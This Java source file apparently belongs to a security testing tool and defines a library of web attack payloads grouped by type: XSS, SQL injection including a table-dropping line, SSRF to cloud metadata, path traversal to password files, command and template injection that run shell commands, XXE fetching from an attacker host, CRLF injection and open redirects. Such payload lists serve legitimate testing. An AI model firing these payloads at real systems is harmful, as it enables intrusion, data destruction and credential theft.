package com.vista.security.core;

import java.util.*;

/**
 * Security testing payload library.
 * Provides categorized attack payloads for various vulnerability types.
 */
public final class PayloadLibrary {
    
    private PayloadLibrary() {
        // Utility class - prevent instantiation
    }
    
    /**
     * Get all payloads organized by category.
     */
    public static Map<String, List<String>> getAllPayloads() {
        Map<String, List<String>> payloads = new LinkedHashMap<>();
        
        payloads.put("XSS", Arrays.asList(
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "javascript:alert(1)",
            "\"><script>alert(1)</script>",
            "'-alert(1)-'",
            "<body onload=alert(1)>",
            "<iframe src=\"javascript:alert(1)\">",
            "<input onfocus=alert(1) autofocus>",
            "<marquee onstart=alert(1)>"
        ));
        
        payloads.put("SQL Injection", Arrays.asList(
            "' OR '1'='1",
            "' OR '1'='1'--",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "1' AND '1'='1",
            "1' AND '1'='2",
            "'; WAITFOR DELAY '0:0:5'--",
            "' AND SLEEP(5)--",
            "1; DROP TABLE users--",
            "' OR 1=1#"
        ));
        
        payloads.put("SSRF", Arrays.asList(
            "http://127.0.0.1",
            "http://localhost",
            "http://[::1]",
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/",
            "file:///etc/passwd",
            "dict://localhost:11211/",
            "gopher://localhost:6379/_INFO",
            "http://0.0.0.0:80",
            "http://127.1"
        ));
        
        payloads.put("Path Traversal", Arrays.asList(
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc/passwd",
            "/etc/passwd%00.jpg",
            "....\\....\\....\\windows\\win.ini",
            "%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
            "..;/..;/..;/etc/passwd",
            "..%00/..%00/etc/passwd"
        ));
        
        payloads.put("Command Injection", Arrays.asList(
            "; id",
            "| whoami",
            "& dir",
            "`id`",
            "$(whoami)",
            "|| ping -c 3 127.0.0.1",
            "%0aid",
            "'; ping -c 3 127.0.0.1; '",
            "\nid\n",
            "| sleep 5"
        ));
        
        payloads.put("XXE", Arrays.asList(
            "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>",
            "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://attacker.com/\">]>",
            "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\">%xxe;]>",
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]>",
            "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">]>"
        ));
        
        payloads.put("SSTI", Arrays.asList(
            "{{7*7}}",
            "${7*7}",
            "<%= 7*7 %>",
            "#{7*7}",
            "*{7*7}",
            "{{config}}",
            "{{self.__class__.__mro__}}",
            "${T(java.lang.Runtime).getRuntime().exec('id')}",
            "{{''.__class__.__mro__[2].__subclasses__()}}",
            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"
        ));
        
        payloads.put("CRLF Injection", Arrays.asList(
            "%0d%0aSet-Cookie:test=1",
            "%0d%0aLocation:http://evil.com",
            "\\r\\nSet-Cookie:test=1",
            "%E5%98%8A%E5%98%8DSet-Cookie:test=1",
            "%0d%0a%0d%0a<script>alert(1)</script>"
        ));
        
        payloads.put("Open Redirect", Arrays.asList(
            "//evil.com",
            "https://evil.com",
            "/\\evil.com",
            "////evil.com",
            "https:evil.com",
            "//evil%E3%80%82com",
            "///evil.com/%2f..",
            "////evil.com/",
            "https://expected.com@evil.com"
        ));
        
        return payloads;
    }
    
    /**
     * Get payloads for a specific vulnerability type.
     */
    public static List<String> getPayloadsForType(String vulnerabilityType) {
        Map<String, List<String>> all = getAllPayloads();
        return all.getOrDefault(vulnerabilityType, Collections.emptyList());
    }
    
    /**
     * Get a formatted list of payloads for display.
     */
    public static String formatPayloadList(String vulnerabilityType) {
        List<String> payloads = getPayloadsForType(vulnerabilityType);
        if (payloads.isEmpty()) return "No payloads available for: " + vulnerabilityType;
        
        StringBuilder sb = new StringBuilder();
        sb.append("=== ").append(vulnerabilityType).append(" Payloads ===\n\n");
        for (int i = 0; i < payloads.size(); i++) {
            sb.append(i + 1).append(". ").append(payloads.get(i)).append("\n");
        }
        return sb.toString();
    }
    
    /**
     * Get all vulnerability categories.
     */
    public static List<String> getCategories() {
        return new ArrayList<>(getAllPayloads().keySet());
    }
}
